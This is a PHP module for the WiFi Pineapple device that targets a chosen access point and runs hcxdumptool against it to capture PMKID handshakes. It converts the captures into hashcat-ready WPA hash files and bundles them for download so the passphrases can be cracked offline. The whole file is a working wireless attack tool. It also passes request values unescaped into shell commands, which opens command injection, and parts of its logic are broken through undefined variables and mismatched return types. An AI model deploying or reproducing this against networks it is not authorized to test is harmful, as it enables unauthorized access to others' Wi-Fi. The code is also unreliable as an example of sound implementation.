<?php

namespace pineapple;

require_once("/pineapple/modules/PineAP/api/PineAPHelper.php");

class PMKIDAttack extends Module
{
    const MODULE_PATH = "/pineapple/modules/PMKIDAttack";
    const DEPS_FLAG = "/tmp/PMKIDAttack.progress";
    const EXPORT_PATH = "/tmp/pmkid-handshake.tmp";
    const TOOLS_PATH = "/sbin/";
    const TOOLS_SD_PATH = "/sd/sbin/";

    private $pineAPHelper;
    private $moduleFolder;
    private $captureFolder;
    private $logPath;
    private $hcxdumptoolPath;
    private $hcxpcaptoolPath;

    public function __construct($request, $moduleClass)
    {
        parent::__construct($request, $moduleClass);

        $this->pineAPHelper = new PineAPHelper();
        $this->moduleFolder = $this->getPathModule();
        $this->captureFolder = "{$this->moduleFolder}/pcapng";
        $this->logPath = "{$this->moduleFolder}/log/module.log";
        $this->hcxdumptoolPath = $this->getToolPath("hcxdumptool");
        $this->hcxpcaptoolPath = $this->getToolPath("hcxpcapngtool"); // old name hcxpcaptool
    }

    public function route()
    {
        switch ($this->request->action) {
            case "clearLog":
                $this->clearLog();
                break;
            case "getLog":
                $this->getLog();
                break;
            case "getDependenciesStatus":
                $this->getDependenciesStatus();
                break;
            case "managerDependencies":
                $this->managerDependencies();
                break;
            case "getDependenciesInstallStatus":
                $this->getDependenciesInstallStatus();
                break;
            case "startAttack":
                $this->startAttack();
                break;
            case "stopAttack":
                $this->stopAttack();
                break;
            case "catchPMKID":
                $this->catchPMKID();
                break;
            case "getPMKIDFiles":
                $this->getPMKIDFiles();
                break;
            case "downloadPMKID":
                $this->downloadPMKID();
                break;
            case "deletePMKID":
                $this->deletePMKID();
                break;
            case "viewAttackLog":
                $this->viewAttackLog();
                break;
            case "getStatusAttack":
                $this->getStatusAttack();
                break;
        }
    }

    protected function getPathModule()
    {
        return self::MODULE_PATH;
    }

    protected function getToolPath($tool)
    {
        $folder = ($this->isSDAvailable()) ?
                self::TOOLS_SD_PATH : self::TOOLS_PATH;

        return "{$folder}{$tool}";
    }

    protected function getCapPath()
    {
        $BSSID = $this->getBSSID(true);

        return "/tmp/{$BSSID}.pcapng";
    }

    protected function clearLog()
    {
        exec("rm {$this->logPath}");
    }

    protected function getLog()
    {
        if (!file_exists($this->logPath)) {
            touch($this->logPath);
        }

        $this->response = array("moduleLog" => file_get_contents($this->logPath));
    }

    protected function addLog($massage)
    {
        file_put_contents($this->logPath, $this->formatLog($massage), FILE_APPEND);
    }

    protected function formatLog($massage)
    {
        return "[" . date("Y-m-d H:i:s") . "] {$massage}\n";
    }

    protected function getDependenciesStatus()
    {
        $response = array(
            "installed" => false,
            "install" => "Install",
            "installLabel" => "success",
            "processing" => false
        );

        if (file_exists(self::DEPS_FLAG)) {
            $response["install"] = "Installing...";
            $response["installLabel"] = "warning";
            $response["processing"] = true;
        } else if (!$this->checkPanelVersion()) {
            $response["install"] = "Upgrade Pineapple version first!";
            $response["installLabel"] = "warning";
        } else if ($this->checkDependencyInstalled()) {
            $response["install"] = "Remove";
            $response["installLabel"] = "danger";
            $response["installed"] = true;
        }

        $this->response = $response;
    }

    protected function checkPanelVersion()
    {
        $version = \helper\getFirmwareVersion();
        $version = str_replace("+", "", $version);

        return version_compare($version, "2.8.0") >= 0;
    }

    protected function checkDependencyInstalled()
    {      
        if ($this->uciGet("pmkidattack.@config[0].installed")) {
            return true; 
        }

        if ($this->checkDependency("hcxdumptool")) {
            $this->uciSet("pmkidattack.@config[0].installed", "1");
            return true; 
        }

        return false;
    }

    protected function managerDependencies()
    {
        $this->stopAttack();
        $action = $this->checkDependencyInstalled() ? "remove" : "install";
        $this->execBackground("{$this->moduleFolder}/scripts/dependencies.sh {$action}");
        $this->response = ["success" => true];
    }

    protected function getDependenciesInstallStatus()
    {
        $this->response = array("success" => !file_exists(self::DEPS_FLAG));
    }

    protected function getMonitorInterface()
    {
        return $this->uciGet("pineap.@config[0].pineap_interface");
    }

    protected function startAttack()
    {
        $this->pineAPHelper->disablePineAP();

        //$this->execBackground("{$this->moduleFolder}/scripts/PMKIDAttack.sh start " . $this->request->bssid);
        $this->uciSet("pmkidattack.@config[0].ssid", $this->request->ssid);
        $this->uciSet("pmkidattack.@config[0].bssid", $this->request->bssid);
        $this->uciSet("pmkidattack.@config[0].attack", "1");

        $BSSID = $this->getBSSID(true);
        $interface = $this->getMonitorInterface();
        $capPath = $this->getCapPath();
        $filterPath = "{$this->moduleFolder}/scripts/filter.txt";

        exec("echo {$BSSID} > {$filterPath}");
        $command = "{$this->hcxdumptoolPath} " . 
            "-o {$capPath} " .
            "-i {$interface} " .
            "--filterlist_ap={$filterPath} " .
            "--filtermode=2 " .
            "--enable_status=1";
        $this->execBackground($command);
        $this->addLog("Start attack {$this->request->bssid}");
        //$this->addLog($command);

        $this->response = ["success" => true];
    }

    protected function stopAttack()
    {
        $BSSID = $this->getBSSID(true);
        $BSSIDFormatted = $this->getBSSID();
        $capPath = $this->getCapPath();

        //$this->execBackground("{$this->moduleFolder}/scripts/PMKIDAttack.sh stop");
        exec("/usr/bin/pkill hcxdumptool");
        exec("rm {$capPath}");

        $this->uciSet("pmkidattack.@config[0].ssid", "");
        $this->uciSet("pmkidattack.@config[0].bssid", "");
        $this->uciSet("pmkidattack.@config[0].attack", "0");
        $this->addLog("Stop attack {$BSSIDFormatted}");

        $this->response = ["success" => true];
    }


    protected function catchPMKID()
    {
        $check = $this->checkPMKID();
        if ($check['status']) {
            $this->addLog("PMKID " . $this->getBSSID() . " intercepted!");

            $metadata = json_encode([
                'ssid' => $this->uciGet("pmkidattack.@config[0].ssid"),
                'bssid' => $BSSIDFormatted
            ]);
            file_put_contents("{$this->captureFolder}/{$BSSID}.data", $metadata);
            exec("cp {$capPath} {$this->captureFolder}/");
        }

        $this->response = [
            "pmkidLog" => $check['log'],
            "success" => $check['status'],
        ];
    }

    protected function getBSSID($clean = false)
    {
        $bssid = $this->uciGet("pmkidattack.@config[0].bssid");

        return $clean ? str_replace(":", "", $bssid) : $bssid;
    }

    protected function checkPMKID()
    {
        $capPath = $this->getCapPath();
        $exportPath = self::EXPORT_PATH;
        if (!file_exists($capPath)) {
            return false;
        }

        // hcxpcaptool 6.0   : -z <file> : output PMKID file (hashcat hashmode -m 16800 old format and john)
        // hcxpcapngtool 6.1 : -o <file> : output WPA-PBKDF2-PMKID+EAPOL (hashcat -m 22000)hash file
        //exec("{$this->moduleFolder}/scripts/PMKIDAttack.sh check-bg " . $this->getBSSID(true));
        exec("{$this->hcxpcaptoolPath} -o {$exportPath} {$capPath}", $result);
        $pmkidLog = implode("\n", $result);

        return [
            'log' => $pmkidLog,

            // on hcxpcaptool 6.0
            //'status' => strpos($pmkidLog, " handshake(s) written to") !== false && strpos($pmkidLog, "0 handshake(s) written to") === false,

            // on hcxpcaptool 6.1
            'status' => strpos($pmkidLog, "Information: no hashes written to hash files") === false,
        ];
    }

    protected function getPMKIDFiles()
    {
        $pmkids = [];
        foreach (glob("{$this->captureFolder}/*.pcapng") as $capture) {
            $file = basename($capture, ".pcapng");
            $metadata = file_get_contents("{$this->captureFolder}/{$file}.data");
            if ($metadata) {
                $captureMetadata = json_decode($metadata, true);
                $name = "{$captureMetadata['ssid']} ({$captureMetadata['bssid']})";
            } else {
                $name = implode(str_split($file, 2), ":");
            }

            $pmkids[] = [
                "file" => $file,
                "name" => $name
            ];
        }

        $this->response = ["pmkids" => $pmkids];
    }

    protected function downloadPMKID()
    {
        $file = $this->request->file;
        $workingDir = "/tmp/PMKIDAttack";

        exec("mkdir {$workingDir}");
        exec("cp {$this->captureFolder}/{$file}.pcapng {$workingDir}/");
        exec("{$this->hcxpcaptoolPath} -o {$workingDir}/pmkid.22000 {$workingDir}/{$file}.pcapng &> {$workingDir}/report.txt");
        exec("cd {$workingDir}/ && tar -czf /tmp/{$file}.tar.gz *");
        exec("rm -rf {$workingDir}/");

        $this->response = array("download" => $this->downloadFile("/tmp/{$file}.tar.gz"));
    }

    protected function deletePMKID()
    {
        $file = escapeshellarg($this->request->file);
        exec("rm {$this->captureFolder}/{$file}.pcapng {$this->captureFolder}/{$file}.data");

        $this->response = ["success" => true];
    }

    protected function viewAttackLog()
    {
        $exportPath = self::EXPORT_PATH;
        $file = $this->request->file;
        $capPath = empty($file) ? $this->getCapPath() : escapeshellarg("{$this->captureFolder}/{$file}.pcapng");
        exec("{$this->hcxpcaptoolPath} -o {$exportPath} {$capPath}", $result);

        $this->response = ["pmkidLog" => implode("\n", $result)];
    }

    protected function getStatusAttack()
    {
        $this->response = [
            "ssid" => $this->uciGet("pmkidattack.@config[0].ssid"),
            "bssid" => $this->uciGet("pmkidattack.@config[0].bssid"),
            "success" => $this->uciGet("pmkidattack.@config[0].attack") === true,
        ];
    }
}